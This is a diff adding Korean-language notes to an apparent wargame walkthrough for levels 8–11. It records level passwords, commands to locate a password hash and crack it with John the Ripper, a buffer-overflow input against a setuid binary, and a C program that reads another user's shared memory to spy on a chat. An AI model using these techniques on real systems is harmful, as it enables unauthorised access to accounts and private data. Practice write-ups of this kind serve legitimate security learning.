@@ -155,3 +155,52 @@ Insert The Password : mate
 
 id : level8
 pw : break the world
+준비물 : john the ripper(https://www.openwall.com/john/)
+- ls -alF
+- cat hint
+- find / -size 2700c 2>/dev/null
+- cd /etc/rc.d
+- cat found.txt
+[john the ripper t(73사용법]
+- 압축 푼 존 더 리퍼의 run 파일로 간다.
+- found.txt의 내용을 복사한 txt파일을 run 파일에 넣는다.
+- cmd를 키고 run 파일로 가서 john.exe [파일이름].txt
+
+id : level9
+pw : apple
+- ls -alF
+- cat hint
+- cd /usr/bin/
+- ./bof
+- [아무거나 16자리]go
+해설 : 버퍼오버플로우가 된다고 힌트에서 나와있다. 그리고 c의 코드를 해석해보면
+buf가 10자리고 buf2가 20자리가 있다. 그리고 buf2에 go가 들어오면 printf와 함께
+level10의 권한을 준다. 이때 my-pass를 하면 당연히 level10의 비밀번호를 얻을 수 있다.
+
+id : level10
+pw : interesting to hack!
+- ls -alF
+- cat hint
+- vi memory.c
+#include<stdio.h>
+#include<sys/shm.h>
+#include<sys/ipc.h>
+
+int main()
+{
+    int a;
+    char* b;
+    a = shmget(7530, 1024, IPC_CREAT|0666); //공유 메모리 생성(key_t, , 권한 설정)
+    b = shmat(a, NULL, 0);  // 공유메모리 호출(공유메모리 식별자, 공유메모리 주소, 동작옵션)
+    printf("%s", b);
+    return 0;
+}
+- gcc -o memory memory.c
+- ./memory
+해설 : 힌트에서 대화방을 통한 대화를 하고 있으며 공유 메모리를 이용한다는 말이 있다.
+여기서 공유 메모리란 여러명이 동시 접근 가능한 메모리를 말하며 key_t 즉, 공유 메모리에
+접근 가능한 키? 를 제공을 해줬으니 C로 코딩해서 공유 메모리의 내용을 출력하는 
+실행파일을 만들어서 대화 내용을 훔쳐본다.
+
+id : level11
+pw : what!@#$?
